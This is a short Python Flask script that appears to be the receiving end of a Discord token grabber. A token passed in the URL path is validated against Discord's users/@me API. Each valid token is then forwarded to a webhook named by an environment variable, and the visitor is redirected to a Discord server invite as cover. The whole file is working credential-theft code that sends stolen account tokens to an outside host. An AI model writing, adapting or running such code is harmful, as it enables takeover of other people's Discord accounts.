from dhooks import Webhook
import os
from flask import Flask, redirect
import requests

def check_discord_token(token):
    url = "https://discord.com/api/v10/users/@me"
    headers = {
        "Authorization": f"{token}"
    }
    
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        return "True"
    else:
        return "False"

e = os.getenv('DISCORD_URL')
app = Flask(__name__)
hook = Webhook(e)
@app.route('/<string:token>')
def index(token):
  if check_discord_token(token) == "True":
      hook.send(token)
  return redirect("https://discord.gg/sTp8ask4ay")

if __name__ == "__main__":
  app.run(host='0.0.0.0', port=81)
